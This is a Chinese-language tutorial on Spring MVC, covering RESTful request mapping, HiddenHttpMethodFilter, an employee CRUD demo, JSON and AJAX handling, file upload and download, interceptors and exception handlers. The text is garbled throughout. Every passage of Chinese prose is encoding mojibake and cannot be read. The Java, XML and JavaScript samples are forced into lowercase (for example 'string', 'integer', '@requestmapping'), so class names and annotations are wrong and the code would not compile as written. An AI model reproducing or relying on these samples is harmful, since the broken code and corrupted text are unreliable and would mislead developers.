é¤èµæºã rest é£æ ¼æå¡ url å°åä½¿ç¨ç»ä¸çé£æ ¼è®¾è®¡ï¼ä»åå°ååä¸ªåè¯ä½¿ç¨ææ åå¼ï¼ä¸ä½¿ç¨é®å·é®å¼å¯¹æ¹å¼æºå¸¦è¯·æ±åæ°ï¼èæ¯å°è¦åéç»æå¡å¨çæ°æ®ä½ä¸º url å°åçä¸é¨åï¼ä»¥ä¿è¯æ´ä½é£æ ¼çä¸è´æ§ã\n\næä½     ä¼ ç»æ¹å¼               resté£æ ¼\næ¥è¯¢æä½   getuserbyid?id=1   user/1--\x3egetè¯·æ±æ¹å¼\nä¿å­æä½   saveuser           user--\x3epostè¯·æ±æ¹å¼\nå é¤æä½   deleteuser?id=1    user/1--\x3edeleteè¯·æ±æ¹å¼\næ´æ°æä½   updateuser         user--\x3eputè¯·æ±æ¹å¼\n\n\n# hiddenhttpmethodfilter\n\nç±äºæµè§å¨åªæ¯æåégetåpostæ¹å¼çè¯·æ±ï¼é£ä¹è¯¥å¦ä½åéputådeleteè¯·æ±å¢ï¼ springmvc æä¾äº hiddenhttpmethodfilter å¸®å©æä»¬å° post è¯·æ±è½¬æ¢ä¸º delete æ put è¯·æ± hiddenhttpmethodfilter å¤çputådeleteè¯·æ±çæ¡ä»¶ï¼\n\n * å½åè¯·æ±çè¯·æ±æ¹å¼å¿é¡»ä¸ºpost\n * å½åè¯·æ±å¿é¡»ä¼ è¾è¯·æ±åæ°_method æ»¡è¶³ä»¥ä¸æ¡ä»¶ï¼hiddenhttpmethodfilter è¿æ»¤å¨å°±ä¼å°å½åè¯·æ±çè¯·æ±æ¹å¼è½¬æ¢ä¸ºè¯·æ±åæ°_methodçå¼ï¼å æ­¤è¯·æ±åæ°_methodçå¼ææ¯æç»çè¯·æ±æ¹å¼\n\nå¨web.xmlä¸­æ³¨åhiddenhttpmethodfilter\n\n<filter>\n    <filter-name>hiddenhttpmethodfilter</filter-name>\n    <filter-class>org.springframework.web.filter.hiddenhttpmethodfilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>hiddenhttpmethodfilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> æ³¨ï¼ ç®åä¸ºæ­¢ï¼springmvcä¸­æä¾äºä¸¤ä¸ªè¿æ»¤å¨ï¼characterencodingfilteråhiddenhttpmethodfilter å¨web.xmlä¸­æ³¨åæ¶ï¼å¿é¡»åæ³¨åcharacterencodingfilterï¼åæ³¨åhiddenhttpmethodfilter åå ï¼\n> \n>  1. å¨ characterencodingfilter ä¸­éè¿ request.setcharacterencoding(encoding) æ¹æ³è®¾ç½®å­ç¬¦éç\n>  2. request.setcharacterencoding(encoding) æ¹æ³è¦æ±åé¢ä¸è½æä»»ä½è·åè¯·æ±åæ°çæä½\n>  3. è hiddenhttpmethodfilter æ°æ°æä¸ä¸ªè·åè¯·æ±æ¹å¼çæä½ï¼string paramvalue = request.getparameter(this.methodparam);\n\n\n# restfulæ¡ä¾\n\n# åå¤å·¥ä½\n\n 1. å®ä½ç±»\n\npublic class employee {\n\nprivate integer id; private string lastname;\n\nprivate string email; //1 male, 0 female private integer gender;\n\npublic integer getid() { return id; }\n\npublic void setid(integer id) { this.id = id; }\n\npublic string getlastname() { return lastname; }\n\npublic void setlastname(string lastname) { this.lastname = lastname; }\n\npublic string getemail() { return email; }\n\npublic void setemail(string email) { this.email = email; }\n\npublic integer getgender() { return gender; }\n\npublic void setgender(integer gender) { this.gender = gender; }\n\npublic employee(integer id, string lastname, string email, integer gender) { super(); this.id = id; this.lastname = lastname; this.email = email; this.gender = gender; }\n\npublic employee() { } }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 2. daoå±æ¨¡ææ°æ®\n\npackage com.atguigu.mvc.dao;\n\nimport java.util.collection;\nimport java.util.hashmap;\nimport java.util.map;\n\nimport com.atguigu.mvc.bean.employee;\nimport org.springframework.stereotype.repository;\n\n\n\n@repository public class employeedao {\n\n\nprivate static map<integer, employee> employees = null;\n\nstatic{\nemployees = new hashmap<integer, employee>();\n\nemployees.put(1001, new employee(1001, "e-aa", "aa@163.com", 1));\nemployees.put(1002, new employee(1002, "e-bb", "bb@163.com", 1));\nemployees.put(1003, new employee(1003, "e-cc", "cc@163.com", 0));\nemployees.put(1004, new employee(1004, "e-dd", "dd@163.com", 0));\nemployees.put(1005, new employee(1005, "e-ee", "ee@163.com", 1));\n}\n\nprivate static integer initid = 1006;\n\npublic void save(employee employee){\nif(employee.getid() == null){\nemployee.setid(initid++);\n}\nemployees.put(employee.getid(), employee);\n}\n\npublic collection<employee> getall(){\nreturn employees.values();\n}\n\npublic employee get(integer id){\nreturn employees.get(id);\n}\n\npublic void delete(integer id){\nemployees.remove(id);\n}\n\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n# å¯¹åºåè½åè¡¨\n\nåè½           url å°å        è¯·æ±æ¹å¼\nè®¿é®é¦é¡µâ        /             get\næ¥è¯¢å¨é¨æ°æ®â      /employee     get\nå é¤â          /employee/2   delete\nè·³è½¬å°æ·»å æ°æ®é¡µé¢â   /toadd        get\næ§è¡ä¿å­â        /employee     post\nè·³è½¬å°æ´æ°æ°æ®é¡µé¢â   /employee/2   get\næ§è¡æ´æ°â        /employee     put\n\n# è®¿é®é¦é¡µåè½\n\n 1. åå»ºé¡µé¢\n\n<!doctype html>  \n<html lang="en" xmlns:th="http://www.thymeleaf.org">  \n<head>  \n <meta charset="utf-8" >  \n <title>title</title>  \n</head>  \n<body>  \n<h1>é¦é¡µ</h1>  \n<a th:href="@{/employee}">è®¿é®åå·¥ä¿¡æ¯</a>  \n</body>  \n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. éç½®view-controller\n\n<mvc:view-controller path="/" view-name="index"/>\n\n\n1\n\n\n# æ¥è¯¢ææåå·¥ä¿¡æ¯åè½\n\n 1. åå»ºé¡µé¢\n\n<!doctype html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="utf-8">\n    <title>employee info</title>\n    <script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n</head>\n<body>\n\n    <table border="1" cellpadding="0" cellspacing="0" style="text-align: center;" id="datatable">\n        <tr>\n            <th colspan="5">employee info</th>\n        </tr>\n        <tr>\n            <th>id</th>\n            <th>lastname</th>\n            <th>email</th>\n            <th>gender</th>\n            <th>options(<a th:href="@{/toadd}">add</a>)</th>\n        </tr>\n        <tr th:each="employee : ${employeelist}">\n            <td th:text="${employee.id}"></td>\n            <td th:text="${employee.lastname}"></td>\n            <td th:text="${employee.email}"></td>\n            <td th:text="${employee.gender}"></td>\n            <td>\n                <a class="deletea" @click="deleteemployee" th:href="@{\'/employee/\'+${employee.id}}">delete</a>\n                <a th:href="@{\'/employee/\'+${employee.id}}">update</a>\n            </td>\n        </tr>\n    </table>\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n 2. åå»ºcontrollerå¤çè¯·æ±æ¹æ³\n\npackage com.pwddd.emp.controller;  \n  \nimport com.pwddd.emp.dao.employeedao;  \nimport com.pwddd.emp.entity.employee;  \nimport org.springframework.beans.factory.annotation.autowired;  \nimport org.springframework.stereotype.controller;  \nimport org.springframework.ui.model;  \nimport org.springframework.web.bind.annotation.requestmapping;  \nimport org.springframework.web.bind.annotation.requestmethod;  \n  \nimport java.util.collection;  \n  \n@controller  \npublic class employeecontroller {  \n  \n @autowired  \n private employeedao employeedao;  \n  \n @requestmapping(value = "/employee", method = requestmethod.get)  \n public string getemployeelist(model model){  \n collection<employee> employeelist = employeedao.getall();  \n model.addattribute("employeelist", employeelist);  \n return "employee_list";  \n }  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# å é¤åè½\n\nå é¤åè½ç¨å¾®éº»ç¦ï¼ä¸è½ä½¿ç¨formè¡¨åè¿è¡æä½ï¼ä½æ¯éè¦è®¾ç½®ä¸ä¸ªéèç_methodå±æ§ï¼å æ­¤å¯ä»¥ä½¿ç¨vueçå°aæ ç­¾è§¦åç»å®å°ä¸ä¸ªformè¡¨åæäº¤ä¹ä¸ï¼ç¶åå¨è¡¨åéé¢æ·»å å±æ§ã\n\n 1. åå»ºå¤çdeleteè¯·æ±æ¹å¼çè¡¨å\n\n\x3c!-- ä½ç¨ï¼éè¿è¶é¾æ¥æ§å¶è¡¨åçæäº¤ï¼å°postè¯·æ±è½¬æ¢ä¸ºdeleteè¯·æ± --\x3e\n<form id="delete_form" method="post">\n    \x3c!-- hiddenhttpmethodfilterè¦æ±ï¼å¿é¡»ä¼ è¾_methodè¯·æ±åæ°ï¼å¹¶ä¸å¼ä¸ºæç»çè¯·æ±æ¹å¼ --\x3e\n    <input type="hidden" name="_method" value="delete"/>\n</form>\n\n\n\n1\n2\n3\n4\n5\n6\n\n 2. å é¤è¶é¾æ¥ç»å®ç¹å»äºä»¶\n\n\x3c!--å¼å¥vue--\x3e\n<script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n\n\x3c!--ç»å®è¡¨å--\x3e\n<a class="deletea" @click="deleteemployee" th:href="@{\'/employee/\'+${employee.id}}">delete</a>\n\n\x3c!--éè¿vueå¤çç¹å»äºä»¶--\x3e\n<script type="text/javascript">\n    var vue = new vue({\n        el:"#datatable",\n        methods:{\n            //eventè¡¨ç¤ºå½åäºä»¶\n            deleteemployee:function (event) {\n                //éè¿idè·åè¡¨åæ ç­¾\n                var delete_form = document.getelementbyid("delete_form");\n                //å°è§¦åäºä»¶çè¶é¾æ¥çhrefå±æ§ä¸ºè¡¨åçactionå±æ§èµå¼\n                delete_form.action = event.target.href;\n                //æäº¤è¡¨å\n                delete_form.submit();\n                //é»æ­¢è¶é¾æ¥çé»è®¤è·³è½¬è¡ä¸º\n                event.preventdefault();\n            }\n        }\n    });\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. åå»ºæå¡ç«¯çæ¹æ³\n\n@requestmapping(value = "/employee/{id}", method = requestmethod.delete)\npublic string deleteemployee(@pathvariable("id") integer id){\n    employeedao.delete(id);\n    return "redirect:/employee";\n}\n\n\n\n1\n2\n3\n4\n5\n6\n\n 4. spring-mvc.xmléç½®æä»¶å¼å¯éæèµæºçé»è®¤servletå¤ç\n\n<mvc:default-servlet-handler default-servlet-name="default" />\n\n\n1\n\n\nå¨é»è®¤æåµä¸ï¼å­å¨ä¸ä¸ªdefalutservletå¤çæä»¬çè¯·æ±ï¼ä½æ¯æä»¬å¨web.xmlä¸­éç½®çdispatchservletçurl-parttenåé»è®¤çä¸æ ·ï¼æä»¥è¿è¡äºè¦çï¼ä¹å°±æ¯å®¢æ·ç«¯çææè¯·æ±é½ä¼æ¾å°dispatchservletè¿è¡å¤çï¼åæ¬éæèµæºï¼ä½æ¯dispatchservletä¸ç¥ééæèµæºå¨åªãå¼å¯é»è®¤çserlvetå¤çéæèµæºï¼å½dispatchservletæ¾ä¸å°è¯·æ±çåå®¹æ¶ï¼äº¤ç»é»è®¤servletå¤çï¼é»è®¤çservletæ¾ä¸å°ï¼å404æ¥éã\n\n# æ°æ®æ°å¢\n\n 1. éç½®view-controller\n\n<mvc:view-controller path="/toadd" view-name="employee_add"></mvc:view-controller>\n\n\n1\n\n 2. åå»ºé¡µé¢\n\n<!doctype html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="utf-8">\n    <title>add employee</title>\n</head>\n<body>\n\n<form th:action="@{/employee}" method="post">\n    lastname:<input type="text" name="lastname"><br>\n    email:<input type="text" name="email"><br>\n    gender:<input type="radio" name="gender" value="1">male\n    <input type="radio" name="gender" value="0">female<br>\n    <input type="submit" value="add"><br>\n</form>\n\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 3. æ°å¢æå¡ç«¯æ¹æ³\n\n@requestmapping(value = "/employee", method = requestmethod.post)\npublic string addemployee(employee employee){\n    employeedao.save(employee);\n    return "redirect:/employee";\n}\n\n\n1\n2\n3\n4\n5\n\n\n# æ°æ®ä¿®æ¹\n\n 1. åå»ºæ°æ®ä¿®æ¹é¡µé¢\n\n<!doctype html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="utf-8">\n    <title>update employee</title>\n</head>\n<body>\n\n<form th:action="@{/employee}" method="post">\n    <input type="hidden" name="_method" value="put">\n    <input type="hidden" name="id" th:value="${employee.id}">\n    lastname:<input type="text" name="lastname" th:value="${employee.lastname}"><br>\n    email:<input type="text" name="email" th:value="${employee.email}"><br>\n    \x3c!--\n        th:field="${employee.gender}"å¯ç¨äºåéæ¡æå¤éæ¡çåæ¾\n        è¥åéæ¡çvalueåemployee.genderçå¼ä¸è´ï¼åæ·»å checked="checked"å±æ§\n    --\x3e\n    gender:<input type="radio" name="gender" value="1" th:field="${employee.gender}">male\n    <input type="radio" name="gender" value="0" th:field="${employee.gender}">female<br>\n    <input type="submit" value="update"><br>\n</form>\n\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 2. æå¡ç«¯éç½®æ°æ®ä¿®æ¹é¡µé¢åæ¾åè·³è½¬é¾æ¥\n\n@requestmapping(value = "/employee/{id}", method = requestmethod.get)\npublic string getemployeebyid(@pathvariable("id") integer id, model model){\n    employee employee = employeedao.get(id);\n    model.addattribute("employee", employee);\n    return "employee_update";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n 3. æå¡ç«¯éç½®ä¿®æ¹æä½æ¹æ³\n\n@requestmapping(value = "/employee", method = requestmethod.put)\npublic string updateemployee(employee employee){\n    employeedao.save(employee);\n    return "redirect:/employee";\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# httpmessageconverter\n\nhttpmessageconverterï¼æ¥æä¿¡æ¯è½¬æ¢å¨ï¼å°è¯·æ±æ¥æè½¬æ¢ä¸ºjavaå¯¹è±¡ï¼æå°javaå¯¹è±¡è½¬æ¢ä¸ºååºæ¥æã httpmessageconverteræä¾äºä¸¤ä¸ªæ³¨è§£åä¸¤ä¸ªç±»åï¼\n\n * @requestbody\n * @responsebody\n * requestentity\n * responseentity\n\n\n# @requestbody\n\n@requestbodyå¯ä»¥è·åè¯·æ±ä½ï¼éè¦å¨æ§å¶å¨æ¹æ³è®¾ç½®ä¸ä¸ªå½¢åï¼ä½¿ç¨@requestbodyè¿è¡æ è¯ï¼å½åè¯·æ±çè¯·æ±ä½å°±ä¼ä¸ºå½åæ³¨è§£ææ è¯çå½¢åèµå¼\n\n<form th:action="@{/testrequestbody}" method="post">\n    ç¨æ·åï¼<input type="text" name="username"><br>\n    å¯ç ï¼<input type="password" name="password"><br>\n    <input type="submit">\n</form>\n\n\n1\n2\n3\n4\n5\n\n\n@requestmapping("/testrequestbody")\npublic string testrequestbody(@requestbody string requestbody){\n    system.out.println("requestbody:"+requestbody);\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n\n\nrequestbody:username=admin&amp;password=123456\n\n\n1\n\n\n\n# requestentity\n\nrequestentityå°è£è¯·æ±æ¥æçä¸ç§ç±»åï¼éè¦å¨æ§å¶å¨æ¹æ³çå½¢åä¸­è®¾ç½®è¯¥ç±»åçå½¢åï¼å½åè¯·æ±çè¯·æ±æ¥æå°±ä¼èµå¼ç»è¯¥å½¢åï¼å¯ä»¥éè¿getheaders()è·åè¯·æ±å¤´ä¿¡æ¯ï¼éè¿getbody()è·åè¯·æ±ä½ä¿¡æ¯\n\n@requestmapping("/testrequestentity")\npublic string testrequestentity(requestentity<string> requestentity){\n    system.out.println("requestheader:"+requestentity.getheaders());\n    system.out.println("requestbody:"+requestentity.getbody());\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nè¾åºç»æï¼ requestheader:[host:"localhost:8080", connection:"keep-alive", content-length:"27", cache-control:"max-age=0", sec-ch-ua:"" not a;brand";v="99", "chromium";v="90", "google chrome";v="90"", sec-ch-ua-mobile:"?0", upgrade-insecure-requests:"1", origin:"[http://localhost:8080"](http://localhost:8080"), user-agent:"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/90.0.4430.93 safari/537.36"] requestbody:username=admin&amp;password=123\n\n\n1\n\n\n\n# @responsebody\n\n@responsebodyç¨äºæ è¯ä¸ä¸ªæ§å¶å¨æ¹æ³ï¼å¯ä»¥å°è¯¥æ¹æ³çè¿åå¼ç´æ¥ä½ä¸ºååºæ¥æçååºä½ååºå°æµè§å¨ã\n\n@requestmapping("/testresponsebody")\n@responsebody\npublic string testresponsebody(){\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# springmvcå¤çjson\n\n 1. å¯¼å¥jackjsonä¾èµ\n\n<dependency>\n    <groupid>com.fasterxml.jackson.core</groupid>\n    <artifactid>jackson-databind</artifactid>\n    <version>2.12.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. å¨springmvcçæ ¸å¿éç½®æä»¶ä¸­å¼å¯mvcçæ³¨è§£é©±å¨ï¼æ­¤æ¶å¨handleradaptorä¸­ä¼èªå¨è£éä¸ä¸ªæ¶æ¯è½¬æ¢å¨ï¼mappingjackson2httpmessageconverterï¼å¯ä»¥å°ååºå°æµè§å¨çjavaå¯¹è±¡è½¬æ¢ä¸ºjsonæ ¼å¼çå­ç¬¦ä¸²\n\n<mvc:annotation-driven />\n\n\n1\n\n\n 3. å¨å¤çå¨æ¹æ³ä¸ä½¿ç¨@responsebodyæ³¨è§£è¿è¡æ è¯\n\n 4. å°javaå¯¹è±¡ç´æ¥ä½ä¸ºæ§å¶å¨æ¹æ³çè¿åå¼è¿åï¼å°±ä¼èªå¨è½¬æ¢ä¸ºjsonæ ¼å¼çå­ç¬¦ä¸²\n\n@requestmapping("/testresponseuser")\n@responsebody\npublic user testresponseuser(){\n    return new user(1001,"admin","123456",23,"ç·");\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# springmvcå¤çajax\n\n 1. è¯·æ±å°åè¶é¾æ¥\n\n<div id="app">\n    <a th:href="@{/testajax}" @click="testajax">testajax</a><br>\n</div>\n\n\n1\n2\n3\n\n 2. éè¿vueåaxioså¤çç¹å»äºä»¶\n\n<script type="text/javascript" th:src="@{/static/js/vue.js}"><\/script>\n<script type="text/javascript" th:src="@{/static/js/axios.min.js}"><\/script>\n<script type="text/javascript">\n    var vue = new vue({\n        el:"#app",\n        methods:{\n            testajax:function (event) {\n                axios({\n                    method:"post",\n                    url:event.target.href,\n                    params:{\n                        username:"admin",\n                        password:"123456"\n                    }\n                }).then(function (response) {\n                    alert(response.data);\n                });\n                event.preventdefault();\n            }\n        }\n    });\n<\/script>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 3. ç¼åæ§å¶å¨æ¹æ³\n\n@requestmapping("/testajax")\n@responsebody\npublic string testajax(string username, string password){\n    system.out.println("username:"+username+",password:"+password);\n    return "hello,ajax";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# @restcontrolleræ³¨è§£\n\n@restcontrolleræ³¨è§£æ¯springmvcæä¾çä¸ä¸ªå¤åæ³¨è§£ï¼æ è¯å¨æ§å¶å¨çç±»ä¸ï¼å°±ç¸å½äºä¸ºç±»æ·»å äº@controlleræ³¨è§£ï¼å¹¶ä¸ä¸ºå¶ä¸­çæ¯ä¸ªæ¹æ³æ·»å äº@responsebodyæ³¨è§£\n\n\n# responseentity\n\nresponseentityç¨äºæ§å¶å¨æ¹æ³çè¿åå¼ç±»åï¼è¯¥æ§å¶å¨æ¹æ³çè¿åå¼å°±æ¯ååºå°æµè§å¨çååºæ¥æã\n\n\n# æä»¶ä¸ä¼ åä¸è½½\n\n\n# æä»¶ä¸è½½åè½\n\n@requestmapping("/testdown")\npublic responseentity<byte[]> testresponseentity(httpsession session) throws ioexception {\n    //è·åservletcontextå¯¹è±¡\n    servletcontext servletcontext = session.getservletcontext();\n    //è·åæå¡å¨ä¸­æä»¶ççå®è·¯å¾\n    string realpath = servletcontext.getrealpath("/static/img/1.jpg");\n    //åå»ºè¾å¥æµ\n    inputstream is = new fileinputstream(realpath);\n    //åå»ºå­èæ°ç»\n    byte[] bytes = new byte[is.available()];\n    //å°æµè¯»å°å­èæ°ç»ä¸­\n    is.read(bytes);\n    //åå»ºhttpheaderså¯¹è±¡è®¾ç½®ååºå¤´ä¿¡æ¯\n    multivaluemap<string, string> headers = new httpheaders();\n    //è®¾ç½®è¦ä¸è½½æ¹å¼ä»¥åä¸è½½æä»¶çåå­\n    headers.add("content-disposition", "attachment;filename=1.jpg");\n    //è®¾ç½®ååºç¶æç \n    httpstatus statuscode = httpstatus.ok;\n    //åå»ºresponseentityå¯¹è±¡\n    responseentity<byte[]> responseentity = new responseentity<>(bytes, headers, statuscode);\n    //å³é­è¾å¥æµ\n    is.close();\n    return responseentity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# æä»¶ä¸ä¼ åè½\n\næä»¶ä¸ä¼ è¦æ±formè¡¨åçè¯·æ±æ¹å¼å¿é¡»ä¸ºpostï¼å¹¶ä¸æ·»å å±æ§enctype="multipart/form-data" springmvcä¸­å°ä¸ä¼ çæä»¶å°è£å°multipartfileå¯¹è±¡ä¸­ï¼éè¿æ­¤å¯¹è±¡å¯ä»¥è·åæä»¶ç¸å³ä¿¡æ¯\n\nä¸ä¼ æ­¥éª¤ï¼\n\n 1. æ·»å ä¾èµ\n\n\x3c!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --\x3e\n<dependency>\n    <groupid>commons-fileupload</groupid>\n    <artifactid>commons-fileupload</artifactid>\n    <version>1.3.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n 2. å¨springmvcçéç½®æä»¶ä¸­æ·»å éç½®\n\n\x3c!--å¿é¡»éè¿æä»¶è§£æå¨çè§£ææè½å°æä»¶è½¬æ¢ä¸ºmultipartfileå¯¹è±¡--\x3e\n<bean id="multipartresolver" class="org.springframework.web.multipart.commons.commonsmultipartresolver"></bean>\n\n\n1\n2\n\n 3. éç½®æ§å¶å¨æ¹æ³\n\n@requestmapping("/testup")\npublic string testup(multipartfile photo, httpsession session) throws ioexception {\n    //è·åä¸ä¼ çæä»¶çæä»¶å\n    string filename = photo.getoriginalfilename();\n    //å¤çæä»¶éåé®é¢\n    string hzname = filename.substring(filename.lastindexof("."));\n    filename = uuid.randomuuid().tostring() + hzname;\n    //è·åæå¡å¨ä¸­photoç®å½çè·¯å¾\n    servletcontext servletcontext = session.getservletcontext();\n    string photopath = servletcontext.getrealpath("photo");\n    file file = new file(photopath);\n    if(!file.exists()){\n        file.mkdir();\n    }\n    string finalpath = photopath + file.separator + filename;\n    //å®ç°ä¸ä¼ åè½\n    photo.transferto(new file(finalpath));\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# æ¦æªå¨\n\n\n# æ¦æªå¨çéç½®\n\nspringmvcä¸­çæ¦æªå¨ç¨äºæ¦æªæ§å¶å¨æ¹æ³çæ§è¡ springmvcä¸­çæ¦æªå¨éè¦å®ç°handlerinterceptor springmvcçæ¦æªå¨å¿é¡»å¨springmvcçéç½®æä»¶ä¸­è¿è¡éç½®ï¼\n\n<bean class="com.atguigu.interceptor.firstinterceptor"></bean>\n<ref bean="firstinterceptor"></ref>\n\x3c!-- ä»¥ä¸ä¸¤ç§éç½®æ¹å¼é½æ¯å¯¹dispatcherservletæå¤ççææçè¯·æ±è¿è¡æ¦æª --\x3e\n<mvc:interceptor>\n    <mvc:mapping path="/**"/>\n    <mvc:exclude-mapping path="/testrequestentity"/>\n    <ref bean="firstinterceptor"></ref>\n</mvc:interceptor>\n\x3c!-- \n    ä»¥ä¸éç½®æ¹å¼å¯ä»¥éè¿refæbeanæ ç­¾è®¾ç½®æ¦æªå¨ï¼éè¿mvc:mappingè®¾ç½®éè¦æ¦æªçè¯·æ±ï¼éè¿mvc:exclude-mappingè®¾ç½®éè¦æé¤çè¯·æ±ï¼å³ä¸éè¦æ¦æªçè¯·æ±\n--\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# æ¦æªå¨çä¸ä¸ªå¤çæ¹æ³\n\nspringmvcä¸­çæ¦æªå¨æä¸ä¸ªæ½è±¡æ¹æ³ï¼ prehandleï¼æ§å¶å¨æ¹æ³æ§è¡ä¹åæ§è¡prehandle()ï¼å¶booleanç±»åçè¿åå¼è¡¨ç¤ºæ¯å¦æ¦æªææ¾è¡ï¼è¿åtrueä¸ºæ¾è¡ï¼å³è°ç¨æ§å¶å¨æ¹æ³ï¼è¿åfalseè¡¨ç¤ºæ¦æªï¼å³ä¸è°ç¨æ§å¶å¨æ¹æ³ posthandleï¼æ§å¶å¨æ¹æ³æ§è¡ä¹åæ§è¡posthandle() aftercomplationï¼å¤çå®è§å¾åæ¨¡åæ°æ®ï¼æ¸²æè§å¾å®æ¯ä¹åæ§è¡aftercomplation()\n\n\n# å¤ä¸ªæ¦æªå¨çæ§è¡é¡ºåº\n\n * è¥æ¯ä¸ªæ¦æªå¨çprehandle()é½è¿åtrue\n   * æ­¤æ¶å¤ä¸ªæ¦æªå¨çæ§è¡é¡ºåºåæ¦æªå¨å¨springmvcçéç½®æä»¶çéç½®é¡ºåºæå³\n   * prehandle()ä¼æç§éç½®çé¡ºåºæ§è¡ï¼èposthandle()åaftercomplation()ä¼æç§éç½®çååºæ§è¡\n * è¥æä¸ªæ¦æªå¨çprehandle()è¿åäºfalse\n   * prehandle()è¿åfalseåå®ä¹åçæ¦æªå¨çprehandle()é½ä¼æ§è¡ï¼posthandle()é½ä¸æ§è¡ï¼è¿åfalseçæ¦æªå¨ä¹åçæ¦æªå¨çaftercomplation()ä¼æ§è¡\n\n\n# å¼å¸¸å¤çå¨\n\n\n# åºäºéç½®çå¼å¸¸å¤ç\n\nspringmvcæä¾äºä¸ä¸ªå¤çæ§å¶å¨æ¹æ³æ§è¡è¿ç¨ä¸­æåºç°çå¼å¸¸çæ¥å£ï¼handlerexceptionresolver handlerexceptionresolveræ¥å£çå®ç°ç±»æï¼defaulthandlerexceptionresolveråsimplemappingexceptionresolver springmvcæä¾äºèªå®ä¹çå¼å¸¸å¤çå¨simplemappingexceptionresolverã\n\n<bean class="org.springframework.web.servlet.handler.simplemappingexceptionresolver">\n    <property name="exceptionmappings">\n        <props>\n            \x3c!--\n                propertiesçé®è¡¨ç¤ºå¤çå¨æ¹æ³æ§è¡è¿ç¨ä¸­åºç°çå¼å¸¸\n                propertiesçå¼è¡¨ç¤ºè¥åºç°æå®å¼å¸¸æ¶ï¼è®¾ç½®ä¸ä¸ªæ°çè§å¾åç§°ï¼è·³è½¬å°æå®é¡µé¢\n            --\x3e\n            <prop key="java.lang.arithmeticexception">error</prop>\n        </props>\n    </property>\n    \x3c!--\n        exceptionattributeå±æ§è®¾ç½®ä¸ä¸ªå±æ§åï¼å°åºç°çå¼å¸¸ä¿¡æ¯å¨è¯·æ±åä¸­è¿è¡å±äº«\n    --\x3e\n    <property name="exceptionattribute" value="ex"></property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# åºäºæ³¨è§£çå¼å¸¸å¤ç\n\n//@controlleradviceå°å½åç±»æ è¯ä¸ºå¼å¸¸å¤ççç»ä»¶\n@controlleradvice\npublic class exceptioncontroller {\n\n    //@exceptionhandlerç¨äºè®¾ç½®ææ è¯æ¹æ³å¤ççå¼å¸¸\n    @exceptionhandler(arithmeticexception.class)\n    //exè¡¨ç¤ºå½åè¯·æ±å¤çä¸­åºç°çå¼å¸¸å¯¹è±¡\n    public string handlearithmeticexception(exception ex, model model){\n        model.addattribute("ex", ex);\n        return "error";\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# æ³¨è§£éç½®springmvc\n\n> ä½¿ç¨éç½®ç±»åæ³¨è§£ä»£æ¿web.xmlåspringmvcéç½®æä»¶çåè½\n\n 1. åå»ºåå§åç±»ï¼ä»£æ¿web.xml\n\nå¨servlet3.0ç¯å¢ä¸­ï¼å®¹å¨ä¼å¨ç±»è·¯å¾ä¸­æ¥æ¾å®ç°javax.servlet.servletcontainerinitializeræ¥å£çç±»ï¼å¦ææ¾å°çè¯å°±ç¨å®æ¥éç½®servletå®¹å¨ã 